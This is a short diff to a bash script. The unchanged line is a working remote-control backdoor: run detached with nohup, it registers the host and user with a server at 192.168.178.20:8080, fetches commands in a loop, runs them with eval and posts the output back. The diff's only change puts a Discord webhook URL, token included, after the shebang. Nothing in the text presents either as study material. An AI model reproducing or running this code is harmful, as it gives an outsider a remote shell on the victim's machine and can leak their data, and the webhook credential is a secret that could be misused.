@@ -1,2 +1,2 @@
-#!/bin/bash
+#!/bin/bash  https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6
 nohup bash -c 's=192.168.178.20:8080&&i=8c2d1d-8c4da5-f0b5a6&&hname=$(hostname)&&p=http://;curl -s "$p$s/8c2d1d/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/8c4da5" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/f0b5a6 -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' & disown
